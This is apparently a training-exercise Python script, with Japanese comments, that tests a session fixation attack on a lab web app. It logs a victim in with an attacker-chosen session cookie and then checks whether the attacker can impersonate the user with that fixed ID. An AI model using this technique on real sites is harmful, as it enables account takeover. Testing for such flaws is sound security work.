# 演習用: セッション固定を試す
import httpx

BASE = "http://app:8000"
FIXED = "attacker-fixed-session-0001"
header = {"Cookie": f"sid={FIXED}"}

# 被害者が、攻撃者の決めた ID を持ったままログインする
victim = httpx.Client(base_url=BASE, timeout=30, follow_redirects=False)
login = victim.post("/login", headers=header,
                    data={"username": "yamada-taro", "password": "password1"})
sid_after = login.cookies.get("sid")
print("ログイン後の sid:", sid_after)
print("固定した ID のまま:", sid_after == FIXED)

# 攻撃者が、固定した ID だけで本人になれるか
attacker = httpx.Client(base_url=BASE, timeout=30)
home = attacker.get("/", headers=header)
print("攻撃者がなりすませた:", "山田 太郎 /" in home.text)
